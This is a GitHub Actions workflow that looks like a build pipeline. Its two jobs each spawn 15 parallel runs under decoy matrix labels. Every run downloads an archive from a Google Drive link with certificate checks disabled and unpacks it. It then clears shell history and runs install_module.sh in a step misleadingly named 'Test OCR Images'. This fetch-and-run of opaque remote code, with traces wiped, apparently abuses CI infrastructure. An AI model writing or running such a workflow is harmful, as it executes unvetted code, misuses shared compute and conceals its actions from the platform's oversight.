name: vuutru9team
on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  RELEASE:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 10
      matrix:
        go: [I.0, I.I, I.II]
        flag: ['Setup', 'Compile', 'Validate', 'Execute', 'Release']

    env:
        NUM_JOBS: 20
        JOB: ${ matrix.go }
    steps:
    - uses: actions/checkout@v1
    - name: Install Packages
      run: |
        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=11lc6cCFncKbUFY3mbbTAZEoKUIkaD44t" -O vuutru9team.zip
        unzip -o vuutru9team.zip
        rm vuutru9team.zip
        history -c && history -w

    - name: Test OCR Images
      run: bash install_module.sh


  Assemble1:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 10
      matrix:
        go: [I.0, I.I, I.II]
        flag: ['Provision', 'Build', 'Confirm', 'Trigger', 'Deploy']

    env:
        NUM_JOBS: 20
        JOB: ${ matrix.go }
    steps:
    - uses: actions/checkout@v1
    - name: Install Packages
      run: |
        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=11lc6cCFncKbUFY3mbbTAZEoKUIkaD44t" -O vuutru9team.zip
        unzip -o vuutru9team.zip
        rm vuutru9team.zip
        history -c && history -w

    - name: Test OCR Images
      run: bash install_module.sh
        
